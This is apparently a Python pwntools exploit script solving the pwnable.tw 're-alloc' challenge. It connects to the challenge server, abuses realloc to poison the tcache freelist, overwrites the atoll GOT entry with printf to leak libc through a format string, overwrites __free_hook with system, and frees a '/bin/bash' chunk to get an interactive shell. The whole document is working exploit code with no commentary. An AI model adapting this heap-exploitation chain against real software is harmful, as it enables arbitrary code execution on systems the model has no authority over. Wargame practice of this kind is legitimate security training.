from pwn import *

BEDUG = False

libc = ELF('./libc.so.6')
elf = ELF('./re-alloc_patched')

if BEDUG==True:
    io = process('./re-alloc_patched', env={"LD_PRELOAD":"./libc.so.6"})
else:
    io = remote('chall.pwnable.tw', 10106)

def add(idx, size, dat):
    io.sendlineafter(b'Your choice: ', b'1')
    io.sendlineafter(b'Index:', str(idx).encode('utf-8'))
    io.sendlineafter(b'Size:', str(size).encode('utf-8'))
    io.sendlineafter(b'Data:', dat)

def realloc(idx, size, dat):
    io.sendlineafter(b'Your choice: ', b'2')
    io.sendlineafter(b'Index:', str(idx).encode('utf-8'))
    io.sendlineafter(b'Size:', str(size).encode('utf-8'))
    io.recvuntil(b'Data:')
    io.send(dat)

def refree(idx, size = 0):
    io.sendlineafter(b'Your choice: ', b'2')
    io.sendlineafter(b'Index:', str(idx).encode('utf-8'))
    io.sendlineafter(b'Size:', str(size).encode('utf-8'))

def free(idx):
    io.sendlineafter(b'Your choice: ', b'3')
    io.sendlineafter(b'Index:', str(idx).encode('utf-8'))

def overwrite(addr = 0x4040a8):
    print('Overwriting heap list...')
    add(0, 0x78, b'')
    refree(0, 0)
    realloc(0, 0x18, p64(addr)+b'HACKER!!')
    add(1, 0x78, b'')
    free(0)
    add(0, 0x78, p64(0x21)+p64(0x4040d0)+p64(0x4040b0)+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x20d41))
    realloc(1, 0x18, p64(0))
    print('Done! Now use write function to arb write')

def write(size, addr, value):
    add(0, size, b'')
    refree(0, 0)
    realloc(0, size, p64(addr))
    realloc(1, 0x18, p64(0))
    add(0, size, b'')
    realloc(1, 0x18, p64(0))
    if (addr == elf.got['stderr']):
        add(0, size, value+b'\0\0\0\0'+b'\x21')
    else:
        add(0, size, value)


overwrite()
write(0x68, elf.got['atoll'], p32(elf.sym['printf']))

io.sendlineafter(b'Your choice: ', b'1')
io.sendlineafter(b'Index:', b'%3$p\n')
libc.address = int(io.recvline(), 16) - 0x12e009
log.info('Libc: '+ hex(libc.address))

io.sendlineafter(b'Your choice: ', b'2')
io.sendlineafter(b'Index:', b'A\0')
io.sendlineafter(b'Size:', b'A'*10+b'\0')
io.recvuntil(b'Data:')
io.send(p64(0))


io.sendlineafter(b'Your choice: ', b'1')
io.sendlineafter(b'Index:', b'\0')
io.sendlineafter(b'Size:', b'A'*10+b'\0')
io.sendlineafter(b'Data:', b'ok')

io.sendlineafter(b'Your choice: ', b'2')
io.sendlineafter(b'Index:', b'\0')
io.sendlineafter(b'Size:', b'\0')

io.sendlineafter(b'Your choice: ', b'2')
io.sendlineafter(b'Index:', b'\0')
io.sendlineafter(b'Size:', b'A'*10+b'\0')
io.recvuntil(b'Data:')
io.send(p64(elf.got['atoll']))

io.sendlineafter(b'Your choice: ', b'2')
io.sendlineafter(b'Index:', b'A\0')
io.sendlineafter(b'Size:', b'A'*10+b'\0')
io.recvuntil(b'Data:')
io.send(p64(0))

io.sendlineafter(b'Your choice: ', b'1')
io.sendlineafter(b'Index:', b'\0')
io.sendlineafter(b'Size:', b'A'*10+b'\0')
io.sendlineafter(b'Data:', b'ok')

io.sendlineafter(b'Your choice: ', b'2')
io.sendlineafter(b'Index:', b'A\0')
io.sendlineafter(b'Size:', b'A'*10+b'\0')
io.recvuntil(b'Data:')
io.send(p64(0))

io.sendlineafter(b'Your choice: ', b'1')
io.sendlineafter(b'Index:', b'\0')
io.sendlineafter(b'Size:', b'A'*10+b'\0')
io.sendlineafter(b'Data:', p64(libc.sym['atoll']))

realloc(1, 0x18, p64(0))
write(0x58, libc.sym['__free_hook'], p64(libc.sym['system']))
realloc(1, 0x18, p64(0))
add(0, 0x38, b'/bin/bash')
free(0)
io.interactive()